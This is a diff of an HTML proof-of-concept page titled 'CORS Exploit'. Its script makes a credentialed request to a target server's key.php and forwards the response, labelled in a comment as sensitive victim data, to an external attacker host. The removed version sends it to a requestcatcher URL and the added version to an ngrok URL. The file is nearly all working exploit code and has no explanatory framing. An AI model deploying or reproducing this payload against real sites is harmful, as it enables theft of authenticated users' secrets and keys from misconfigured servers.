@@ -1,19 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
+<title>CORS PoC Exploit</title>
+</head>
 <body>
-<script>
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-    if(this.readyState == 4) {
-        var data = this.responseText;
-        // ส่งไปที่ requestcatcher
-        var img = new Image();
-        img.src = "https://asscor.requestcatcher.com/log?key=" + encodeURIComponent(data);
-    }
+<center>
+
+<h1>CORS Exploit</h1>
+<hr>
+<script type="text/javascript">
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+	if(this.readyState == 4 && this.responseText) {
+	 var a = this.responseText; // Sensitive data from victim target
+	 //alert(a);
+	 xhttp.open("GET", "https://tactful-brim-urban.ngrok-free.dev/log?key="+a, true);// Sending that data to Attacker's website
+	 xhttp.withCredentials = true;
+	 console.log(a);
+	 xhttp.send();
+ }
 };
-xhr.open("GET", "http://136.85.123.253/key.php", true);
-xhr.withCredentials = true;
-xhr.send();
+xhttp.open("GET", "http://136.85.123.253//key.php", true);
+xhttp.withCredentials = true;
+xhttp.send();
 </script>
+
+</center>
 </body>
 </html>
